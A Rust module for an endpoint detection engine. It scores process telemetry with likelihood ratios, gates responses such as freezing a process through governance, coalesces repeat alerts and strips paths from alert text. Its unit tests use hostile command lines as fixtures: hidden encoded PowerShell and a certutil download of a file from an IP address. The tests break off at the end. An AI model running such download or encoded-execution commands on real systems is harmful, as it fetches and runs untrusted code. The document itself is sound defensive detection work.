//! The monitoring-response pipeline (ASMR chapters 33-34).
//!
//! This is the only crate that knows both the wire format and the algebra. The
//! ASMR crates are pure mathematics with no I/O and no knowledge of telemetry;
//! the adapters know how to produce bytes and nothing about what they mean.
//! Every place the two meet is here, on purpose, so the algebra stays testable
//! with numbers and the sensor stays testable with bytes.
//!
//! One event flows like this:
//!
//! 1. **Project** into the A1 state space, and append to the A2 trace. A process
//!    start also teaches the A22 novelty model and the A23 structural profile,
//!    because those are statements about what has been seen, and "has been seen"
//!    is exactly what the state space tracks.
//! 2. **Evaluate** the detection rules, each of which produces a [`Finding`]
//!    carrying a likelihood ratio rather than a verdict.
//! 3. **Accumulate** the findings as log-odds (A5). Addition, not multiplication,
//!    because independent evidence composes additively in that representation.
//! 4. **Decide** (A8) against a cost ratio, using the threshold theorem rather
//!    than a hand-tuned number. Weak evidence alone is expected to abstain.
//! 5. **Govern** (A12) the chosen action, and record the outcome whether or not
//!    it was permitted.
//! 6. **Minimise** (A19) the alert body before it leaves the host.

pub mod report;
pub mod rules;

use asmr::action::{Action, ActionId, ActionKind, ActionSpace};
use asmr::anomaly::{EdgeKey, StructuralProfile};
use asmr::decision::{Costs, Decision};
use asmr::governance::{ActionRequest, AuditLog, Severity as GovSeverity, Verdict};
use asmr::infer::LogOdds;
use asmr::novelty::NoveltyModel;
use asmr::observe::{ObsId, ObservationMap};
use asmr::privacy::generalisation_bucket;
use asmr::state::{AttrValue, Entity, EntityId, EntityKind, StateSpace};
use asmr::trace::{EventId, Trace, TraceEvent};
use model::{Alert, AlertId, EventKind, HostId, RuleId, Severity as ModelSeverity, TelemetryEvent};
use std::collections::BTreeMap;

pub use report::{Metrics, Observation};
pub use rules::Finding;

/// The governance vocabulary, re-exported so a caller can set the autonomy level
/// and the policy without depending on the algebra crate directly. The agent
/// configures detection; it has no business importing a lattice to do it.
pub use asmr::governance::{AutonomyLevel, GovernancePolicy};

/// What the pipeline decided should be done, and whether it may be done.
pub use ports::Response;

/// How the pipeline is tuned.
///
/// `costs` is the interesting one. It is a claim about the business, not about
/// the detector: what does one wasted analyst hour cost, and what does one
/// missed intrusion cost? Everything the engine does downstream — how many
/// alerts, of what severity — is derived from those two numbers, which is why
/// they are configuration rather than constants buried in a rule.
#[derive(Debug, Clone)]
pub struct Config {
    pub host: HostId,
    pub costs: Costs,
    pub policy: GovernancePolicy,
    pub autonomy: AutonomyLevel,
    /// Prior probability that an arbitrary process on this host is malicious,
    /// before any evidence.
    pub prior: f64,
    /// How long a rule stays quiet after alerting.
    ///
    /// A repeat firing inside this window is folded into the previous alert as
    /// a count rather than emitted again. This is the difference between a
    /// queue an analyst reads and one they scroll past: the same rule firing
    /// two hundred times on one host is one fact about that host, not two
    /// hundred facts.
    pub suppression_window_ns: i64,
    /// The lowest severity that gets its own row.
    ///
    /// Below this, firings are counted and held, and published only if the
    /// evidence later clears the floor. This is the knob for trading recall
    /// against a queue someone will actually read.
    pub min_row_severity: ModelSeverity,
}

impl Config {
    pub fn new(host: HostId) -> Self {
        Self {
            host,
            // A wasted investigation is an hour of an analyst's time. A missed
            // intrusion is an incident. The ratio is what sets the threshold.
            costs: Costs::new(1.0, 20.0),
            policy: GovernancePolicy::default(),
            autonomy: AutonomyLevel::Approve,
            prior: 0.01,
            // Five minutes. Long enough to collapse one burst into one alert,
            // short enough that an ongoing incident keeps re-announcing itself
            // instead of going quiet for the rest of the shift.
            suppression_window_ns: 5 * 60 * 1_000_000_000,
            // Medium. Below it sit the single weak signals — one unusual
            // lookup, one signed binary doing something odd — which are real
            // but are also what makes an untuned queue unreadable.
            min_row_severity: ModelSeverity::Medium,
        }
    }
}

/// Coalescing state for one rule.
#[derive(Debug, Clone)]
struct Suppression {
    /// When an alert for this rule was last emitted.
    last_emitted_ns: i64,
    /// How many firings have been folded into it since.
    folded: u32,
    /// The worst severity among the firings this row stands for.
    ///
    /// The maximum, not the first: a row representing a hundred and thirty
    /// firings must report the worst of them, or a rule that started quiet and
    /// escalated would keep wearing the label it earned when it was quiet.
    max_severity: ModelSeverity,
    /// The alert as emitted, so a flush can restate it with an updated count.
    /// `None` while the rule is still below the floor and has never published.
    last: Option<Alert>,
}

/// What to do with a firing, decided before anything is published.
#[derive(Debug, Clone, Copy)]
enum Emission {
    /// Strong enough evidence, and it is time to say so.
    Emit { count: u32, severity: ModelSeverity },
    /// Above the floor, but a row for this rule is already open.
    Fold,
    /// Not yet worth a row. Counted, not published.
    BelowFloor,
}

/// Severity from the evidence, not from the response.
///
/// These are deliberately not the action's severity. `T1547.001` on a Run key
/// deserves attention even when the response chosen is only \"raise alert\", and
/// a severity column that tracked the verb would answer \"what did we decide to
/// do\" when the analyst is asking \"how worried should I be\".
///
/// The bands are set where a single decisive detection lands at `Medium`: with
/// a one-percent prior, one rule at a likelihood ratio of fifty is a thirty-odd
/// percent chance the host is compromised, which is not quiet.
fn severity_for(probability: f64) -> ModelSeverity {
    if probability >= 0.90 {
        ModelSeverity::Critical
    } else if probability >= 0.60 {
        ModelSeverity::High
    } else if probability >= 0.30 {
        ModelSeverity::Medium
    } else if probability >= 0.10 {
        ModelSeverity::Low
    } else {
        ModelSeverity::Info
    }
}

/// What the engine remembers about one running process.
#[derive(Debug, Clone)]
struct ProcRecord {
    entity: u64,
    image: Box<str>,
    children: u32,
}

/// Facts gathered before evaluation, owned so the rules borrow nothing from the
/// engine.
#[derive(Debug, Clone, Default)]
struct OwnedFacts {
    image: Option<String>,
    command_line: Option<String>,
    parent_image: Option<String>,
    image_is_novel: bool,
    siblings: u32,
}

impl OwnedFacts {
    fn as_facts(&self) -> rules::Facts<'_> {
        rules::Facts {
            image: self.image.as_deref(),
            command_line: self.command_line.as_deref(),
            parent_image: self.parent_image.as_deref(),
            image_is_novel: self.image_is_novel,
            siblings: self.siblings,
        }
    }
}

/// A response the engine has decided on, for something outside it to carry out.
///
/// The engine decides; the agent acts. Keeping execution out is what lets the
/// decision logic be tested with no operating system and no mocks, and it puts
/// the one irreversible thing this product does behind a boundary somebody can
/// point at.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ProposedResponse {
    /// The alert this belongs to, so an outcome can be tied back to a row.
    pub alert_id: AlertId,
    pub response: Response,
    /// Whether governance cleared this to run without a human.
    ///
    /// `false` means propose only. The agent still surfaces it — an operator
    /// wants to see what the policy *would* have done — and must still not act,
    /// because the autonomy level said so.
    pub automatic: bool,
}

/// The pipeline.
pub struct Engine {
    cfg: Config,
    state: StateSpace,
    trace: Trace,
    observe: ObservationMap,
    novelty: NoveltyModel,
    anomaly: StructuralProfile,
    actions: ActionSpace,
    audit: AuditLog,
    /// A5 evidence, per entity.
    posteriors: BTreeMap<u64, LogOdds>,
    /// A8 alert coalescing, per rule.
    suppression: BTreeMap<&'static str, Suppression>,
    processes: BTreeMap<u32, ProcRecord>,
    /// Decisions awaiting a drain by whoever can actually act on them.
    responses: Vec<ProposedResponse>,
    metrics: Metrics,
    next_entity: u64,
    next_event: u64,
    next_alert: u64,
    /// Distinguishes this run of the agent from the next.
    run_nonce: u64,
}

/// A value that differs between one run and the next.
///
/// Taken from the wall clock, deliberately *not* from the first event's
/// timestamp. A replaying source — a log backfill, a captured trace, this
/// crate's own deterministic generator — hands every run identical timestamps,
/// so deriving uniqueness from them silently reinstates exactly the collision
/// the nonce exists to prevent.
///
/// Mixed with a process-local counter because two engines can be constructed
/// inside one clock tick, and the clock alone would then hand them the same
/// value.
fn run_nonce() -> u64 {
    static SEQUENCE: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);

    let nanos = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|elapsed| elapsed.as_nanos() as u64)
        .unwrap_or(0);
    let ordinal = SEQUENCE.fetch_add(1, std::sync::atomic::Ordering::Relaxed);

    nanos ^ ordinal.wrapping_mul(0x9E37_79B9_7F4A_7C15)
}

impl Engine {
    pub fn new(cfg: Config) -> Self {
        Self {
            cfg,
            state: StateSpace::new(),
            trace: Trace::new(),
            observe: ObservationMap::new(),
            novelty: NoveltyModel::new(),
            anomaly: StructuralProfile::new(),
            actions: default_actions(),
            audit: AuditLog::new(),
            posteriors: BTreeMap::new(),
            suppression: BTreeMap::new(),
            processes: BTreeMap::new(),
            responses: Vec::new(),
            metrics: Metrics::default(),
            next_entity: 1,
            next_event: 1,
            next_alert: 1,
            run_nonce: run_nonce(),
        }
    }

    /// Feed one decoded event through the whole pipeline.
    ///
    /// Returns an alert when the evidence crossed the threshold *and* policy
    /// permitted the response. A `None` is not the same as "nothing happened":
    /// the metrics distinguish an abstention from a policy refusal, and the
    /// audit log records both.
    pub fn ingest(&mut self, event: &TelemetryEvent) -> Option<Alert> {
        self.metrics.events += 1;

        let facts = self.gather(event);
        self.project(event);

        let findings = rules::evaluate(event, &facts.as_facts());
        for finding in &findings {
            self.metrics.record_finding(
                finding.rule,
                finding.likelihood.hit,
                finding.likelihood.miss,
            );
        }

        let key = evidence_key(event);
        let probability = self.accumulate(key, &findings);

        match asmr::decision::decide(probability, &self.cfg.costs) {
            Decision::Act => self.respond(event, &findings, probability),
            Decision::Abstain => {
                // Only worth counting as a deliberate abstention when there was
                // something to abstain about.
                if !findings.is_empty() {
                    self.metrics.abstained += 1;
                }
                None
            }
        }
    }

    /// Facts about the emitting process, read before the state is updated so
    /// that "how many siblings" means siblings *before* this one.
    fn gather(&self, event: &TelemetryEvent) -> OwnedFacts {
        let EventKind::ProcessStart(start) = &event.kind else {
            return OwnedFacts::default();
        };

        let image = start.executable.to_string();
        let parent = start.parent_pid.map(|p| p.as_u32());
        let parent_record = parent.and_then(|p| self.processes.get(&p));

        OwnedFacts {
            image_is_novel: self.novelty.is_novel(&image.to_ascii_lowercase()),
            parent_image: parent_record.map(|r| r.image.to_string()),
            siblings: parent_record.map_or(0, |r| r.children),
            command_line: start.command_line.as_ref().map(|c| c.to_string()),
            image: Some(image),
        }
    }

    /// Step 1: project the event into state, trace, novelty and structure.
    fn project(&mut self, event: &TelemetryEvent) {
        let ts = timestamp_ns(event);

        match &event.kind {
            EventKind::ProcessStart(start) => {
                self.metrics.process_starts += 1;

                let pid = start.pid.as_u32();
                let image = start.executable.to_string();
                let entity = self.next_entity;
                self.next_entity += 1;

                let mut attrs = BTreeMap::new();
                if let Some(parent) = start.parent_pid {
                    attrs.insert(
                        "parent_pid".into(),
                        AttrValue::Int(i64::from(parent.as_u32())),
                    );
                }
                if let Some(user) = &start.user {
                    attrs.insert("user".into(), AttrValue::Text(user.clone()));
                }

                self.state.observe(Entity {
                    id: EntityId(entity),
                    kind: EntityKind::Process,
                    label: image.clone().into_boxed_str(),
                    first_seen_ns: ts,
                    last_seen_ns: ts,
                    attrs,
                });

                self.novelty.observe(&image.to_ascii_lowercase());
                self.observe.observe(u64::from(pid), ObsId(entity));

                if let Some(parent) = start.parent_pid.map(|p| p.as_u32()) {
                    let parent_image = self
                        .processes
                        .get(&parent)
                        .map(|r| r.image.to_string())
                        .unwrap_or_else(|| "<unobserved>".to_string());

                    // A23 scores the edge *before* it is taught; after this call
                    // the edge is no longer novel, by definition.
                    let _structural_score =
                        self.anomaly
                            .score(&EdgeKey::new(&parent_image, &image, "spawned"));
                    self.anomaly
                        .observe_edge(EdgeKey::new(&parent_image, &image, "spawned"));

                    if let Some(record) = self.processes.get_mut(&parent) {
                        record.children += 1;
                    }
                }

                self.processes.insert(
                    pid,
                    ProcRecord {
                        entity,
                        image: image.into_boxed_str(),
                        children: 0,
                    },
                );
                self.push_trace(ts, entity, "process_start");
            }

            EventKind::ProcessExit(exit) => {
                let pid = exit.pid.as_u32();
                let entity = self.processes.remove(&pid).map(|r| r.entity);
                self.push_trace(ts, entity.unwrap_or(0), "process_exit");
            }

            other => {
                let entity = self
                    .processes
                    .get(&event.pid)
                    .map_or(0, |r| u64::from(r.entity));
                self.push_trace(ts, entity, other.as_str());
            }
        }
    }

    fn push_trace(&mut self, ts_ns: i64, actor: u64, action: &str) {
        self.trace.push(TraceEvent {
            id: EventId(self.next_event),
            ts_ns,
            actor,
            action: action.into(),
            target: None,
        });
        self.next_event += 1;
    }

    /// Step 3: fold this event's findings into the entity's log-odds.
    fn accumulate(&mut self, key: u64, findings: &[Finding]) -> f64 {
        let prior = self.cfg.prior;
        let posterior = self
            .posteriors
            .entry(key)
            .or_insert_with(|| LogOdds::from_prob(prior));

        for finding in findings {
            posterior.add(finding.likelihood.log_ratio());
        }
        posterior.to_prob()
    }

    /// Steps 4 to 6: decide, govern, and emit.
    fn respond(
        &mut self,
        event: &TelemetryEvent,
        findings: &[Finding],
        probability: f64,
    ) -> Option<Alert> {
        let action_id = self.choose_action(probability);
        let action = self.actions.get(action_id)?;

        let request = ActionRequest {
            name: action.name.clone(),
            severity: gov_severity(action.severity),
            reversible: action.reversible,
            blast_radius: action.blast_radius,
            disruptive: action.kind.disruptive(),
        };

        let verdict = self.audit.record(
            timestamp_ns(event),
            &request,
            self.cfg.autonomy,
            &self.cfg.policy,
        );

        let (technique, rule) = findings
            .iter()
            .max_by(|a, b| {
                a.likelihood
                    .log_ratio()
                    .partial_cmp(&b.likelihood.log_ratio())
                    .unwrap_or(std::cmp::Ordering::Equal)
            })
            .map(|f| (f.technique, f.rule))
            .unwrap_or(("TA0000", "unclassified"));

        match verdict {
            Verdict::Denied => {
                self.metrics.withheld_by_policy += 1;
                None
            }
            Verdict::Auto | Verdict::RequiresApproval => {
                // A8: coalesce, and hold the quiet ones back.
                //
                // Two jobs in one place. A rule that keeps firing is one alert
                // carrying a count, not N alerts carrying nothing; and a firing
                // whose evidence does not clear the floor is counted but not
                // published, because a queue of weak rows is worse than no
                // queue. It publishes the moment it clears the floor, carrying
                // everything it held back.
                let now = timestamp_ns(event);
                let severity = severity_for(probability);

                let emission = {
                    let state = self.suppression.entry(rule).or_insert(Suppression {
                        last_emitted_ns: i64::MIN,
                        folded: 0,
                        max_severity: severity,
                        last: None,
                    });
                    state.folded = state.folded.saturating_add(1);
                    if severity > state.max_severity {
                        state.max_severity = severity;
                    }

                    if state.max_severity < self.cfg.min_row_severity {
                        Emission::BelowFloor
                    } else if state.last.is_none()
                        || now.saturating_sub(state.last_emitted_ns)
                            >= self.cfg.suppression_window_ns
                    {
                        Emission::Emit {
                            count: state.folded,
                            severity: state.max_severity,
                        }
                    } else {
                        Emission::Fold
                    }
                };

                let (count, severity) = match emission {
                    Emission::BelowFloor => {
                        self.metrics.below_floor += 1;
                        return None;
                    }
                    Emission::Fold => {
                        self.metrics.suppressed += 1;
                        return None;
                    }
                    Emission::Emit { count, severity } => (count, severity),
                };

                let needs_human = verdict == Verdict::RequiresApproval;
                let title = if needs_human {
                    format!("{} \u{2014} awaiting approval", rules::rule_title(rule))
                } else {
                    rules::rule_title(rule).to_string()
                };

                let body = findings
                    .iter()
                    .map(|f| format!("{}: {}", f.technique, minimise(&f.detail)))
                    .collect::<Vec<_>>()
                    .join("; ");

                self.metrics.alerts += 1;
                let id = format!("{}-{}", self.run_nonce, self.next_alert);
                self.next_alert += 1;

                let alert = Alert::new(
                    AlertId::new(id).ok()?,
                    RuleId::new(rule).ok()?,
                    title.into_boxed_str(),
                    format!(
                        "{} (p={probability:.4}, n={count}) via {rule}; {body}",
                        action.name
                    )
                    .into_boxed_str(),
                    severity,
                    event.timestamp,
                    self.cfg.host.clone(),
                    Vec::new(),
                    vec![technique.into()],
                )
                .with_count(count);

                // Record the decision for whoever can act on it. The engine does
                // not act, and it is the only place that knows both the action
                // and the target, so the proposal is made here and drained by
                // the agent.
                if let Some(response) = self.planned_response(action.kind, event) {
                    self.responses.push(ProposedResponse {
                        alert_id: alert.id.clone(),
                        response,
                        automatic: verdict == Verdict::Auto,
                    });
                }

                // Keep the emitted alert so a flush can restate it with the
                // firings that arrive after it. Without this, a run in which
                // the window never lapses reports `count = 1` while having
                // silently folded away dozens — under-reporting, which is the
                // dangerous direction for coalescing to be wrong in.
                if let Some(state) = self.suppression.get_mut(rule) {
                    state.last = Some(alert.clone());
                    state.last_emitted_ns = now;
                    state.folded = 0;
                }

                Some(alert)
            }
        }
    }

    /// The action justified by the evidence alone. Governance decides
    /// separately whether we are allowed to take it.
    fn choose_action(&self, probability: f64) -> ActionId {
        let kind = if probability >= 0.995 {
            ActionKind::Isolate
        } else if probability >= 0.98 {
            ActionKind::Freeze
        } else if probability >= 0.90 {
            ActionKind::CompensatingControl
        } else {
            ActionKind::Alert
        };

        self.actions
            .escalation_ladder()
            .into_iter()
            .find(|id| self.actions.get(*id).is_some_and(|a| a.kind == kind))
            .unwrap_or(ActionId(2))
    }

    /// The concrete thing to do about a decided action, when there is one.
    ///
    /// Only `Freeze` maps. `Isolate` is host-wide and needs firewall
    /// manipulation the agent does not have, and `CompensatingControl` and
    /// `Alert` change nothing on the machine. Leaving those unmapped means an
    /// alert says "proposed" and nothing quietly pretends to have isolated a
    /// host — the honest answer for a capability that is not built yet.
    fn planned_response(&self, kind: ActionKind, event: &TelemetryEvent) -> Option<Response> {
        match kind {
            ActionKind::Freeze => Some(Response::Suspend {
                pid: evidence_key(event) as u32,
            }),
            _ => None,
        }
    }

    /// Take the responses decided since the last drain.
    ///
    /// Draining is the caller's job, the same way [`Engine::flush_suppressed`]
    /// is: the engine has no opinion about who acts, or whether anyone does.
    pub fn take_responses(&mut self) -> Vec<ProposedResponse> {
        std::mem::take(&mut self.responses)
    }

    pub fn metrics(&self) -> &Metrics {
        &self.metrics
    }

    /// Emit an updated copy of every alert that has since been folded into.
    ///
    /// Called when a run ends. The suppression window handles the long-lived
    /// case — a rule that keeps firing re-announces itself on the next lapse,
    /// carrying its count — but a run shorter than the window would otherwise
    /// end with the folded firings counted in the agent's metrics and nowhere
    /// in the data. This closes that gap.
    ///
    /// The returned alerts repeat their original id, so a server that merges on
    /// identity updates the row rather than adding one.
    pub fn flush_suppressed(&mut self) -> Vec<Alert> {
        let mut out = Vec::new();
        for state in self.suppression.values_mut() {
            if state.folded == 0 {
                continue;
            }
            // `None` means the rule never cleared the floor, so there is no row
            // to update. Those firings stay counted in the metrics and out of
            // the queue, which is what having a floor means.
            if state.last.is_none() {
                continue;
            }

            // Advance the *stored* alert, not just a copy of it. This is not
            // necessarily the last flush: an agent following a live stream
            // restates on every interval, and one that kept reporting the total
            // the first flush saw would pin the server's count there. The server
            // takes the larger of two restatements, so it has no way to notice
            // that a number stopped moving.
            let folded = state.folded;
            state.folded = 0;
            if let Some(alert) = state.last.as_mut() {
                alert.count = alert.count.saturating_add(folded);
                out.push(alert.clone());
            }
        }
        out
    }

    /// Prior probability of compromise before any evidence (A5).
    pub fn prior(&self) -> f64 {
        self.cfg.prior
    }

    /// The alerting threshold derived from the cost ratio (A8).
    ///
    /// Nothing in the pipeline chooses this number; it falls out of
    /// `C_fp / (C_fp + C_fn)`, which is why changing what a miss costs changes
    /// behaviour without touching a rule.
    pub fn threshold(&self) -> f64 {
        self.cfg.costs.threshold()
    }

    pub fn autonomy(&self) -> AutonomyLevel {
        self.cfg.autonomy
    }

    pub fn audit(&self) -> &AuditLog {
        &self.audit
    }

    pub fn state(&self) -> &StateSpace {
        &self.state
    }

    pub fn trace(&self) -> &Trace {
        &self.trace
    }

    /// Assemble the run report (A3 gap, A15 capacity, A11 load).
    pub fn observation(&self, offered_rate: f64, sensor_capacity: f64) -> Observation {
        report::build(
            &self.metrics,
            &self.observe,
            self.state.len(),
            self.novelty.distinct(),
            self.anomaly.edges(),
            offered_rate,
            sensor_capacity,
        )
    }
}

/// A19: keep the shape of a detail, drop what identifies a person.
///
/// Paths are the main leak. `C:\Users\a.smith\Documents\redundancy-list.xlsx`
/// says something about an employee; `.xlsx` says something about a file, which
/// is all the detector needed.
fn minimise(detail: &str) -> String {
    detail
        .split(' ')
        .map(|token| {
            if token.contains('\\') || token.contains('/') {
                generalisation_bucket(token).to_string()
            } else {
                token.to_string()
            }
        })
        .collect::<Vec<_>>()
        .join(" ")
}

fn evidence_key(event: &TelemetryEvent) -> u64 {
    match &event.kind {
        EventKind::ProcessStart(start) => u64::from(start.pid.as_u32()),
        _ => u64::from(event.pid),
    }
}

fn timestamp_ns(event: &TelemetryEvent) -> i64 {
    event.timestamp.timestamp_nanos_opt().unwrap_or(0)
}

/// What the algebra calls a severity.
///
/// Two enums with the same five names is worth a sentence: the wire format and the
/// algebra are separate layers and neither may depend on the other, so the
/// translation lives here, where they already meet. Naming the policy's view
/// separately also makes a reader stop and check which one they are holding — a
/// mistake there is the difference between an alert and a frozen process.
pub use asmr::governance::Severity as PolicySeverity;

/// The policy view of a wire severity.
///
/// One function rather than a `From` impl, because this is a translation between
/// layers rather than a conversion: it is the only place that gets to decide that
/// the two scales line up, and the day they stop lining up is the day this fails
/// to compile.
pub fn policy_severity(severity: ModelSeverity) -> PolicySeverity {
    match severity {
        ModelSeverity::Info => PolicySeverity::Info,
        ModelSeverity::Low => PolicySeverity::Low,
        ModelSeverity::Medium => PolicySeverity::Medium,
        ModelSeverity::High => PolicySeverity::High,
        ModelSeverity::Critical => PolicySeverity::Critical,
    }
}

/// A severity from the action ladder's numeric field.
///
/// The `Action` type keeps severity as a number because the algebra only ever
/// compares it. This is where a comparison turns back into a name.
fn gov_severity(severity: u8) -> GovSeverity {
    match severity {
        5 => GovSeverity::Critical,
        4 => GovSeverity::High,
        3 => GovSeverity::Medium,
        2 => GovSeverity::Low,
        _ => GovSeverity::Info,
    }
}

/// The response ladder this deployment is allowed to choose from.
fn default_actions() -> ActionSpace {
    let mut space = ActionSpace::new();
    space.register(Action::new(
        ActionId(1),
        "record",
        ActionKind::Observe,
        1,
        true,
        0,
        0,
    ));
    space.register(Action::new(
        ActionId(2),
        "raise alert",
        ActionKind::Alert,
        2,
        true,
        0,
        0,
    ));
    space.register(Action::new(
        ActionId(3),
        "apply compensating control",
        ActionKind::CompensatingControl,
        3,
        true,
        1,
        300,
    ));
    space.register(Action::new(
        ActionId(4),
        "freeze process",
        ActionKind::Freeze,
        4,
        true,
        1,
        0,
    ));
    // Irreversible and wide: exactly the shape A12 must gate.
    space.register(Action::new(
        ActionId(5),
        "isolate host",
        ActionKind::Isolate,
        5,
        false,
        500,
        900,
    ));
    space
}

#[cfg(test)]
mod tests {
    use super::*;
    use model::{EventId, EventSource, Payload, ProcessId, ProcessStart, RegistrySet, Value};

    fn engine() -> Engine {
        Engine::new(Config::new(HostId::new("host-a").unwrap()))
    }

    fn start(pid: u32, parent: u32, image: &str, cmd: Option<&str>) -> TelemetryEvent {
        TelemetryEvent::new(
            EventId::new(1),
            HostId::new("host-a").unwrap(),
            chrono::Utc::now(),
            EventSource::WindowsEtw,
            model::ProviderId::new("Microsoft-Windows-Kernel-Process"),
            1,
            pid,
            pid,
            4,
            EventKind::ProcessStart(ProcessStart {
                pid: ProcessId::new(pid),
                parent_pid: Some(ProcessId::new(parent)),
                executable: image.into(),
                command_line: cmd.map(Into::into),
                user: None,
                working_directory: None,
                started_at: chrono::Utc::now(),
                image_hash: None,
                integrity_level: None,
            }),
            Payload::new(Value::Null).unwrap(),
        )
    }

    #[test]
    fn repeat_firings_coalesce_into_one_alert_with_a_count() {
        // The same campaign repeated on one host is one fact about that host.
        let mut e = engine();
        let template = "powershell -NoProfile -EncodedCommand SQBFAFgA -WindowStyle Hidden";

        let mut alerts = Vec::new();
        for pid in 100..110 {
            alerts.push(e.ingest(&start(pid, 4, "powershell.exe", Some(template))));
        }

        assert_eq!(alerts[0].as_ref().map(|a| a.count), Some(1));
        assert!(
            alerts[1..].iter().all(Option::is_none),
            "the repeats must be folded, not emitted"
        );
        assert_eq!(e.metrics().alerts, 1);
        assert_eq!(e.metrics().suppressed, 9);
        // Coalescing suppresses *notifications*, never decisions. Every firing
        // was still governed and audited, because an audit trail that skips the
        // events you chose not to tell anyone about is not an audit trail.
        assert_eq!(e.audit().len(), 10);
    }

    #[test]
    fn a_lapsed_window_speaks_again_and_reports_what_it_swallowed() {
        let mut e = engine();
        let template = "powershell -EncodedCommand SQBFAFgA -WindowStyle Hidden";

        e.ingest(&start(100, 4, "powershell.exe", Some(template)));
        for pid in 101..105 {
            e.ingest(&start(pid, 4, "powershell.exe", Some(template)));
        }
        assert_eq!(e.metrics().suppressed, 4);

        // Move past the window and fire again. The new alert must carry the
        // four firings it represents, or the coalescing would have hidden them.
        let mut late = start(200, 4, "powershell.exe", Some(template));
        late.timestamp = chrono::Utc::now() + chrono::Duration::seconds(600);
        let alert = e.ingest(&late).expect("a fresh window alerts again");

        assert_eq!(alert.count, 5, "one new firing plus four folded in");
        assert_eq!(e.metrics().alerts, 2);
    }

    #[test]
    fn the_title_is_a_sentence_not_a_technique_code() {
        let mut e = engine();
        let alert = e
            .ingest(&start(
                100,
                4,
                "powershell.exe",
                Some("powershell -enc AAAA -w hidden"),
            ))
            .expect("strong evidence alerts");

        assert_eq!(&*alert.title, "Encoded PowerShell command");
        // The technique belongs in its own column, not repeated in the title.
        assert!(!alert.title.contains("T1059"));
        assert_eq!(&*alert.mitre_techniques[0], "T1059.001");
    }

    #[test]
    fn a_flush_reports_what_the_window_swallowed() {
        // The dangerous failure of coalescing is under-reporting: a run shorter
        // than the window must not end with the firings counted in the metrics
        // and absent from the data.
        let mut e = engine();
        let template = "powershell -EncodedCommand SQBFAFgA -WindowStyle Hidden";
        for pid in 100..160 {
            e.ingest(&start(pid, 4, "powershell.exe", Some(template)));
        }
        assert_eq!(e.metrics().alerts, 1);
        assert_eq!(e.metrics().suppressed, 59);

        let flushed = e.flush_suppressed();
        assert_eq!(flushed.len(), 1, "one rule, one updated alert");
        assert_eq!(flushed[0].count, 60, "one plus the fifty-nine folded in");

        // Flushing twice must not double-count.
        assert!(e.flush_suppressed().is_empty());
    }

    #[test]
    fn a_flush_after_more_firings_carries_the_running_total() {
        // The case a single end-of-run flush never exercised, and the one a
        // following agent hits every interval: firmings that arrive *after* a
        // flush must be reported on top of the total it already stated, not
        // instead of it.
        let mut e = engine();
        let template = "powershell -EncodedCommand SQBFAFgA -WindowStyle Hidden";

        for pid in 100..150 {
            e.ingest(&start(pid, 4, "powershell.exe", Some(template)));
        }
        let first = e.flush_suppressed();
        assert_eq!(first[0].count, 50);

        for pid in 200..250 {
            e.ingest(&start(pid, 4, "powershell.exe", Some(template)));
        }
        let second = e.flush_suppressed();
        assert_eq!(
            second[0].count, 100,
            "the second restatement must carry the running total"
        );

        // Still one alert identity, so the server merges rather than appends.
        assert_eq!(second[0].id, first[0].id);
    }

    #[test]
    fn alert_ids_are_unique_across_engine_instances() {
        // A server merging on alert id must not fold a new run's first alert
        // into the previous run's. The ids must therefore differ even when the
        // *events* are identical, which is what a replaying source produces.
        let fixed = chrono::DateTime::from_timestamp(1_700_000_000, 0).expect("valid epoch");
        let template = "powershell -enc AAAA -w hidden";

        let mut event = start(1, 4, "powershell.exe", Some(template));
        event.timestamp = fixed;

        let mut first = engine();
        let a = first.ingest(&event).expect("alerts");

        let mut second = engine();
        let b = second.ingest(&event).expect("alerts");

        assert_ne!(
            a.id, b.id,
            "identical timestamps must not produce identical alert ids"
        );
    }

    #[test]
    fn a_weak_signal_is_counted_but_held_out_of_the_queue() {
        // One signed binary doing something odd is real evidence and a poor
        // row: it is the row an analyst learns to skip. The floor exists to
        // hold it back while still counting it.
        let mut e = engine();
        let event = start(
            500,
            4,
            "certutil.exe",
            Some("certutil -urlcache -split -f http://198.51.100.7/a.dat a.dat"),
        );

        assert!(e.ingest(&event).is_none(), "below the floor, so no row");
        assert_eq!(e.metrics().below_floor, 1);
        assert_eq!(e.metrics().alerts, 0);
        assert_eq!(
            e.metrics().suppressed,
            0,
            "held back is not the same as folded"
        );

        // And a flush must not resurrect it: it never earned a row.
        assert!(e.flush_suppressed().is_empty());
    }

    #[test]
    fn a_held_back_rule_publishes_once_the_evidence_justifies_it() {
        let mut e = engine();
        let event = start(
            500,
            4,
            "certutil.exe",
            Some("certutil -urlcache -split -f http://198.51.100.7/a.dat a.dat"),
        );
        assert!(e.ingest(&event).is_none());
        assert_eq!(e.metrics().below_floor, 1);

        // The same rule again on the same process. The accumulated evidence now
        // puts the host at high, so the row appears carrying both firings.
        let alert = e.ingest(&event).expect("the floor is cleared");
        assert_eq!(alert.count, 2, "the held-back firing comes with it");
        assert_eq!(alert.severity, model::Severity::High);
        assert_eq!(e.metrics().below_floor, 1, "only the first was held back");
    }

    #[test]
    fn severity_tracks_the_evidence_not_the_response() {
        // The action for a middling posterior is only `raise alert`, whose own
        // severity is low. The row must report how worried to be, not what we
        // decided to do, or the column cannot be used to triage.
        let mut e = engine();
        let alert = e
            .ingest(&start(
                100,
                4,
                "powershell.exe",
                Some("powershell -enc AAAA -w hidden"),
            ))
            .expect("alerts");

        assert_eq!(alert.severity, model::Severity::Medium);
        assert!(
            alert.description.contains("raise alert"),
            "the response is in the body"
        );
    }

    #[test]
    fn ordinary_activity_produces_no_alert() {
        let mut e = engine();
        assert!(
            e.ingest(&start(100, 4, "C:\\Windows\\System32\\notepad.exe", None))
                .is_none()
        );
        assert_eq!(e.metrics().alerts, 0);
        assert_eq!(e.metrics().process_starts, 1);
    }

    #[test]
    fn strong_evidence_crosses_the_threshold_and_raises_an_alert() {
        let mut e = engine();
        let event = start(
            100,
            4,
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            Some("powershell -NoProfile -EncodedCommand SQBFAFgA -WindowStyle Hidden"),
        );
        let alert = e.ingest(&event).expect("strong evidence must alert");
        assert_eq!(e.metrics().alerts, 1);
        assert!(
            alert
                .mitre_techniques
                .iter()
                .any(|t| t.contains("T1059.001")),
            "alert should name the technique: {:?}",
            alert.mitre_techniques
        );
    }

    #[test]
    fn weak_evidence_alone_abstains() {
